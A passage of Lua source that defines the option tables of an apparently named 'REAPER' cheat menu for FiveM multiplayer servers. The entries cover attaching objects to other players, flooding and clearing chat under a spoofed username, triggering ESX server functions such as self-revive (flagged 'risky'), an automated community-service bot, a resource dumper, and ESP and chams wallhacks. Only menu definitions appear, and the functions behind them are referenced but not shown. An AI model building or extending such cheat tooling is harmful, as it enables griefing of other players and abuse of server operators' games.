            {text = 'Flag German', dkey = 'server:targetinglist:attach_germanflag', desc = 'Attach a german flag to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_german_yt`},
            {text = 'Flag Russian', dkey = 'server:targetinglist:attach_russianflag', desc = 'Attach a russian flag to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_russia_yt`},
            {text = 'Flag UK', dkey = 'server:targetinglist:attach_ukflag', desc = 'Attach a uk flag to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_uk_yt`},
            {text = 'Flag US', dkey = 'server:targetinglist:attach_usflag', desc = 'Attach a us flag to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_us_yt`},
            {text = 'Flag Hungarian', dkey = 'server:targetinglist:attach_hunflag', desc = 'Attach a hungarian flag to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_hungary`},
            {text = 'Flag French', dkey = 'server:targetinglist:attach_frenchflag', desc = 'Attach a french flag to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `apa_prop_flag_france`},
            {text = 'Body parts', dkey = 'server:targetinglist:attach_bodyparts', desc = 'Attach body parts to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `v_ilev_body_parts`},
            {text = 'Ball', dkey = 'server:targetinglist:attach_ball', desc = 'Attach a ball to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `v_ilev_exball_blue`},
            {text = 'Snowman', dkey = 'server:targetinglist:attach_snowman', desc = 'Attach a snowman to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `prop_prlg_snowpile`},
            {text = 'Safe', dkey = 'server:targetinglist:attach_safe', desc = 'Attach a safe to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `p_v_43_safe_s`},
            {text = 'Windmill', dkey = 'server:targetinglist:attach_windmill', desc = 'Attach a windmill to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `prop_windmill_01`},
            {text = 'UFO', dkey = 'server:targetinglist:attach_ufo', desc = 'Attach a ufo to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `imp_prop_ship_01a`},
            {text = 'Alien egg', dkey = 'server:targetinglist:attach_alienegg', desc = 'Attach a alien egg to the player.', afu = __REAPER1__.M.tlist.attach.attach, option = __REAPER1__.M.Button, extra = `prop_alien_egg_01`},
        },

        ['scripts'] = {
            {text = 'Resource dumper', dkey = 'scripts:dumper', desc = 'Resource dumper menu.', option = __REAPER1__.M.Menu_Button, func = {'scripts', 'scripts:dumper'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'ES Extended', dkey = 'scripts:esx', desc = 'ESX menu.', option = __REAPER1__.M.Menu_Button, func = {'scripts', 'scripts:esx'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'V RolePlay', dkey = 'scripts:vrp', desc = 'VRP menu.', option = __REAPER1__.M.Menu_Button, func = {'scripts', 'scripts:vrp'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Automatic bots', dkey = 'scripts:bots', desc = 'Bots menu.', option = __REAPER1__.M.Menu_Button, func = {'scripts', 'scripts:bots'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Commands', dkey = 'scripts:commands', desc = 'Commands menu.', option = __REAPER1__.M.Menu_Button, func = {'scripts', 'scripts:commands'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Chat', option = __REAPER1__.M.Separator},
            {text = 'Send message', dkey = 'scripts_sendmessage', desc = 'Send the chat message.', afu = __REAPER1__.M.scripts.sendmsg, option = __REAPER1__.M.Button, risky = true},
            {text = 'Flood chat', dkey = 'scripts_floodchat', desc = 'Flood the chat with the messages.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Chat clear', dkey = 'scripts_chatclear', desc = 'Enable chat clearing. Doesn\'t work with\nrp chats.', afu = __REAPER1__.M.scripts.chatc, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Delay', dkey = 'scripts_delay', desc = 'Delay between chat clears and chat\nfloods.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Chat delay number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Message', dkey = 'scripts_message', desc = 'The chat message to be sent.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'The chat message', length = 100, tipus = 'vegyes', func = 'None'},
            {text = 'Username', dkey = 'scripts_username', desc = 'The username that the message will\nbe sent with. Doesn\'t work with rp chats.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Chat message username', length = 100, tipus = 'vegyes', func = 'None'},
            {text = 'Color', dkey = 'scripts_color', desc = 'Message color. Mostly it won\'t work.\nFormat: r g b.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Chat message color', length = 11, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0}, func = '0 0 0'},
        },

        ['scripts:dumper'] = {
        },

        ['scripts:esx'] = {
            {text = 'Revive', dkey = 'scripts:esx_revive', desc = 'Revive yourself.', afu = __REAPER1__.M.scripts.esx.revive, option = __REAPER1__.M.Button, risky = true},
            {text = 'Refill status', dkey = 'scripts:esx_refillstatus', desc = 'Fill your hunger or your thirst.', afu = __REAPER1__.M.scripts.esx.refillstatus, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Status type', length = 10, tipus = 'betu', func = {'Both', 'Hunger', 'Thirst'}},
            {text = 'Save outfit', dkey = 'scripts:esx_saveoutfit', desc = 'Save your current outfit in the esx\ndatabase.', afu = __REAPER1__.M.scripts.esx.saveoutfit, option = __REAPER1__.M.Button, risky = true},
            {text = 'Outfit menu', dkey = 'scripts:esx_outfitmenu', desc = 'Open the esx outfit menu.', afu = __REAPER1__.M.scripts.esx.outfitmenu, option = __REAPER1__.M.Button, risky = true},
            {text = 'Identity', dkey = 'scripts:esx_identity', desc = 'Set your identity. Format:\nFirstName LastName Birth Sex Height.', afu = __REAPER1__.M.scripts.esx.identity, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Set your identity', length = 40, tipus = 'vegyes', func = 'None None None None None'},
        },

        ['scripts:vrp'] = {
        },
            
        ['scripts:bots'] = {
            {text = 'Community service bot', dkey = 'scripts:bots_commservbot', desc = 'Toggle the community service bot.', afu = __REAPER1__.M.scripts.bots.commserv, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Update loactions', dkey = 'scripts:bots_updatelocs', desc = 'If the server has custom community\nservice locations, you can update them\nhere.', afu = __REAPER1__.M.scripts.bots.updateloc, option = __REAPER1__.M.Button},
            {text = 'Amount to do', dkey = 'scripts:bots_amounttodo', desc = 'The community service amount you\nwant the bot to do.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Community service amount', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Delay before (sec)', dkey = 'scripts:bots_delaybef', desc = 'The delay before to do an amount.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Delay before start', length = 3, tipus = 'szam', toggle = false, func = __REAPER1__.T.Szazas},
            {text = 'Delay after (sec)', dkey = 'scripts:bots_delayaf', desc = 'The delay after you did an amount.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Delay after start', length = 3, tipus = 'szam', toggle = false, func = __REAPER1__.T.Szazas},
            {text = 'Disconnect', dkey = 'scripts:bots_disconnect', desc = 'Disconnect from the server when\nfinished.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Quit', dkey = 'scripts:bots_quit', desc = 'When finished quit the game.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Crash', dkey = 'scripts:bots_crash', desc = 'When finished crash yourself.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['scripts:commands'] = {
            {text = 'Custom', dkey = 'scripts:commands:custom', desc = 'Custom server commands menu.', option = __REAPER1__.M.Menu_Button, func = {'scripts:commands', 'scripts:commands:custom'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Default', dkey = 'scripts:commands:default', desc = 'The default fivem commands menu.', option = __REAPER1__.M.Menu_Button, func = {'scripts:commands', 'scripts:commands:default'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Register a command', dkey = 'settings_registeracommand', desc = 'Register a command.', afu = __REAPER1__.M.scripts.commands.register, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Command name', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Overall commands', dkey = 'settings_overallcommands', desc = 'The amount of commands.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Don\'t even try haha', length = 1, tipus = 'szam', func = ''},
        },

        ['scripts:commands:custom'] = {
        },

        ['scripts:commands:default'] = {
        },

        ['visuals'] = {
            {text = 'Skeleton esp', dkey = 'visuals:skeletonesp', desc = 'Skeleton esp menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:skeletonesp'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Text esp', dkey = 'visuals:textesp', desc = 'Text esp menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:textesp'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Chams', dkey = 'visuals:chams', desc = 'Chams menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:chams'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Box esp', dkey = 'visuals:boxesp', desc = 'Box esp menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:boxesp'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Bars esp', dkey = 'visuals:baresp', desc = 'Bars esp menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:baresp'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Fov arrows', dkey = 'visuals:fovarrows', desc = 'Out of fov arrows menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:fovarrows'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Glowing', dkey = 'visuals:glowing', desc = 'Glowing menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:glowing'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Line esp', dkey = 'visuals:lineesp', desc = 'Line esp menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:lineesp'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Markers', dkey = 'visuals:markers', desc = 'Markers menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:markers'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Blips', dkey = 'visuals:blips', desc = 'Blips menu.', option = __REAPER1__.M.Menu_Button, func = {'visuals', 'visuals:blips'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Bounding box', option = __REAPER1__.M.Separator},
            {text = 'Bounding box', dkey = 'visuals_boundingbox', desc = 'Toggle the bounding boxes.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals_target', desc = 'The \'targets\' the bounding box should\nwork on.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bounding box target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds', 'Vehicles', 'Objects'}},
            {text = 'Only players', dkey = 'visuals_onlyplayers', desc = 'Make the bounding box only work\nwith players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals_self', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Distance', dkey = 'visuals_distance', desc = 'The distance within the bounding boxes\nwill be visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bounding box distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only alive', dkey = 'visuals_onlyalive', desc = 'Make the bounding box only work on\nalive peds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'visuals_colortype', desc = 'Color type of the bounding box.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bounding box color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals_color', desc = 'Set the bounding box color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Bounding box color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Bounding box fill', option = __REAPER1__.M.Separator},
            {text = 'Box filling', dkey = 'visuals_boxfilling', desc = 'Toggle the filling of the bounding boxes.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals_ftarget', desc = 'The \'targets\' the bounding box fill should\nwork on.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bounding box fill target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds', 'Vehicles', 'Objects'}},
            {text = 'Only players', dkey = 'visuals_fonlyplayers', desc = 'Make the bounding box fill only work\nwith players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals_fself', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Distance', dkey = 'visuals_fdistance', desc = 'The distance within the bounding box\nfilling will be visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bounding box fill distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only alive', dkey = 'visuals_fonlyalive', desc = 'Make the bounding box filling only work\non alive peds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'visuals_fcolortype', desc = 'Color type of the bounding box fill.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bounding box fill color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals_fcolor', desc = 'Set the bounding box fill color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Bounding box fill color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['visuals:textesp'] = {
            {text = 'Text esp', dkey = 'visuals:textesp_textesp', desc = 'Toggle the text esp. Visible through\neverything.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Information', dkey = 'visuals:textesp_information', desc = 'The information that will be displayed.', afu = __REAPER1__.M.visuals.textesp.info, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Text esp information', length = 20, tipus = 'betu', func = {'Player id', 'Distance', 'Health', 'Armour', 'Status', 'Weapon', 'Speed'}, extra = {[1] = false, [2] = false, [3] = false, [4] = false, [5] = false, [6] = false, [7] = false}},
            {text = 'Target', dkey = 'visuals:textesp_target', desc = 'The targets the text esp should work on.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Text esp target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds', 'Vehicles', 'Objects'}},
            {text = 'Distance', dkey = 'visuals:textesp_distance', desc = 'The distance within the text esp will\nbe visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Text esp distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only players', dkey = 'visuals:textesp_onlyplayers', desc = 'Make the text esp only work with\nplayers.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals:textesp_self', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only alive', dkey = 'visuals:textesp_onlyalive', desc = 'Make the text esp only work on alive\npeds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Text config', option = __REAPER1__.M.Separator},
            {text = 'Offset', dkey = 'visuals:textesp_offset', desc = 'The x y z offsets for the position of\nthe text esp.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Offset coords', length = 30, tipus = 'coords', func = '0.0 0.0 0.0', extra = vector3(0.0, 0.0, 0.0)},
            {text = 'Font', dkey = 'visuals:textesp_font', desc = 'The text font.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Text font', length = 20, tipus = 'szam', func = {0, 1, 2, 3, 4, 5, 6, 7}},
            {text = 'Scale', dkey = 'visuals:textesp_scale', desc = 'The text scale.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Text scale', length = 20, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Center', dkey = 'visuals:textesp_center', desc = 'Align the text to the center instead of the left.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Outline', dkey = 'visuals:textesp_outline', desc = 'Toggle the text outline.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Shadow', dkey = 'visuals:textesp_shadow', desc = 'Toggle the text shadow.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'visuals:textesp_colortype', desc = 'Color type of the text esp.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Text esp color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:textesp_color', desc = 'Set the text esp color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Text esp color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Secondary color', dkey = 'visuals:textesp_secondarycolor', desc = 'The secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 30, tipus = 'betu', toggle = false, func = {'Occluded', 'Targeting list'}},
            {text = 'Color type', dkey = 'visuals:textesp_ocolortype', desc = 'Secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:textesp_ocolor', desc = 'Secondary color type for the text esp\ncolor. Format: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['visuals:chams'] = {
            {text = 'Chams', dkey = 'visuals:chams_chams', desc = 'Toggle the chams. Might not always\napply. Reapply if some clothes didn\'t\nchange.', afu = __REAPER1__.M.visuals.chams.chams, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:chams_target', desc = 'Freemode Male/Female are supported.\nAddon clothes don\'t work. Reapply to\nmake changes.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Cham target', length = 10, tipus = 'betu', func = {'Male', 'Female', 'Both'}},
            {text = 'Textures', dkey = 'visuals:chams_textures', desc = 'Textures for the cham included in\nthe menu.', afu = __REAPER1__.M.visuals.chams.texture, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Cham texture', length = 20, tipus = 'betu', func = {'White', 'Black', 'Red', 'Orange', 'Yellow', 'Green', 'Blue', 'Cyan', 'Pink', 'Purple', 'Disco', 'Rain Blue', 'Rain Red', 'Rain Green', 'Liquid'}},
            {text = 'Custom texture', dkey = 'visuals:chams_customtexture', desc = 'Type in a image link to make it a\ntexture, for example from imgur.\nGifs work too.', afu = __REAPER1__.M.visuals.chams.texture, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Image link', length = 50, tipus = 'vegyes', func = ''},
            {text = 'Weapon chams', option = __REAPER1__.M.Separator},
            {text = 'Weapon chams', dkey = 'visuals:chams_wchams', desc = 'Toggle the weapon chams. Reapply if\nsome weapons didn\'t change.', afu = __REAPER1__.M.visuals.chams.wchams, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Weapon', dkey = 'visuals:chams_weapon', desc = 'Reapply to make changes.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Cham weapon', length = 10, tipus = 'betu', func = {'All', "Knife", "Dagger", "Switchblade", "Hatchet", "Battleaxe", "Stone_Hatchet", "Machete", "Bat", "Golfclub", "Poolcue", "Nightstick", "Crowbar", "Wrench", "Hammer", "Flashlight", "Knuckle", "Bottle", "Pistol", "Pistol_MK2", "Combatpistol", "Appistol", "Stungun", "Pistol50", "Snspistol", "Snspistol_MK2", "Heavypistol", "Vintagepistol", "Flaregun", "Marksmanpistol", "Revolver", "Revolver_MK2", "Doubleaction", "Raypistol", "Ceramicpistol", "Navyrevolver", "Microsmg", "Smg", "Smg_MK2", "Assaultsmg", "Combatpdw", "Machinepistol", "Minismg", "Raycarbine", "Pumpshotgun", "Pumpshotgun_MK2", "Sawnoffshotgun", "Assaultshotgun", "Bullpupshotgun", "Musket", "Heavyshotgun", "Dbshotgun", "Autoshotgun", "Assaultrifle", "Assaultrifle_MK2", "Carbinerifle", "Carbinerifle_MK2", "Advancedrifle", "Specialcarbine", "Specialcarbine_MK2", "Bullpuprifle", "Bullpuprifle_MK2", "Compactrifle", "Mg", "Combatmg", "Combatmg_MK2", "Gusenberg", "Sniperrifle", "Heavysniper", "Heavysniper_MK2", "Marksmanrifle", "Marksmanrifle_MK2", "RPG", "Grenadelauncher", "Minigun", "Firework", "Railgun", "Hominglauncher", "Compactlauncher", "Rayminigun", "Grenade", "Bzgas", "Molotov", "Stickybomb", "Proxmine", "Snowball", "Pipebomb", "Ball", "Smokegrenade", "Flare", "Petrolcan", "Parachute", "Fireextinguisher"}},
            {text = 'Textures', dkey = 'visuals:chams_wtextures', desc = 'Textures for the weapon cham\nincluded in the menu.', option = __REAPER1__.M.Combo, afu = __REAPER1__.M.visuals.chams.wtexture, cindex = 1, sindex = 1, textboxtext = 'Weapon cham texture', length = 20, tipus = 'betu', func = {'White', 'Black', 'Red', 'Orange', 'Yellow', 'Green', 'Blue', 'Cyan', 'Pink', 'Purple', 'Disco', 'Rain Blue', 'Rain Red', 'Rain Green', 'Liquid'}},
            {text = 'Custom texture', dkey = 'visuals:chams_wcustomtexture', desc = 'Type in a image link to make it a\ntexture, for example from imgur.\nGifs work too.', afu = __REAPER1__.M.visuals.chams.wtexture, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Image link', length = 50, tipus = 'vegyes', func = ''},
        },

        ['visuals:skeletonesp'] = {
            {text = 'Skeleton esp', dkey = 'visuals:skeletonesp_skeletonesp', desc = 'Toggle the skeleton esp. Visible through\neverything.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:skeletonesp_target', desc = 'The targets the skeleton esp should work\non.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Skeleton esp target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds'}},
            {text = 'Distance', dkey = 'visuals:skeletonesp_distance', desc = 'The distance within the skeleton esp will\nbe visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Skeleton esp distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only players', dkey = 'visuals:skeletonesp_onlyplayers', desc = 'Make the skeleton esp only work with\nplayers.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals:skeletonesp_self', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only alive', dkey = 'visuals:skeletonesp_onlyalive', desc = 'Make the skeleton esp only work on alive\npeds.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Skeleton esp config', option = __REAPER1__.M.Separator},
            {text = 'Color type', dkey = 'visuals:skeletonesp_colortype', desc = 'Color type of the skeleton esp.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Skeleton color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:skeletonesp_color', desc = 'Set the skeleton esp color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Skeleton color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Secondary color', dkey = 'visuals:skeletonesp_secondarycolor', desc = 'The secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 30, tipus = 'betu', toggle = false, func = {'Occluded', 'Targeting list'}},
            {text = 'Color type', dkey = 'visuals:skeletonesp_ocolortype', desc = 'Color type of the secondary skeleton.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary skeleton color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:skeletonesp_ocolor', desc = 'Set the secondary skeleton color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary skeleton color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['visuals:boxesp'] = {
            {text = 'Box esp', dkey = 'visuals:boxesp_boxesp', desc = 'Toggle the box esp. Visible through\neverything.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:boxesp_target', desc = 'The targets the box esp should work\non.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Box esp target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds', 'Vehicles', 'Objects'}},
            {text = 'Distance', dkey = 'visuals:boxesp_distance', desc = 'The distance within the box esp will\nbe visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Box esp distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only players', dkey = 'visuals:boxesp_onlyplayers', desc = 'Make the box esp only work with\nplayers.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals:boxesp_self', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only alive', dkey = 'visuals:boxesp_onlyalive', desc = 'Make the box esp only work on alive\npeds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Thickness', dkey = 'visuals:boxesp_thickness', desc = 'The tickness of the box esp lines. 30 = 1\npixel. Works best with the value of 30.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Box esp thickness number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Length', dkey = 'visuals:boxesp_length', desc = 'The lenght of the four box esp lines.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Box esp line length number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Color type', dkey = 'visuals:boxesp_colortype', desc = 'Color type of the box esp.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Box color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:boxesp_color', desc = 'Set the box esp color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Box color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Secondary color', dkey = 'visuals:boxesp_secondarycolor', desc = 'The secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 30, tipus = 'betu', toggle = false, func = {'Occluded', 'Targeting list'}},
            {text = 'Color type', dkey = 'visuals:boxesp_ocolortype', desc = 'Color type of the secondary box.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary box color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:boxesp_ocolor', desc = 'Set the secondary box color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary box color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Box esp fill', option = __REAPER1__.M.Separator},
            {text = 'Box fill', dkey = 'visuals:boxesp_fboxesp', desc = 'Toggle the box esp fill. Visible through\neverything.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:boxesp_ftarget', desc = 'The targets the box esp fill should work\non.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Box esp fill target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds', 'Vehicles', 'Objects'}},
            {text = 'Distance', dkey = 'visuals:boxesp_fdistance', desc = 'The distance within the box esp fill will\nbe visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Box fill distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only players', dkey = 'visuals:boxesp_fonlyplayers', desc = 'Make the box esp fill only work with\nplayers.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals:boxesp_fself', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only alive', dkey = 'visuals:boxesp_fonlyalive', desc = 'Make the box esp fill only work on alive\npeds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
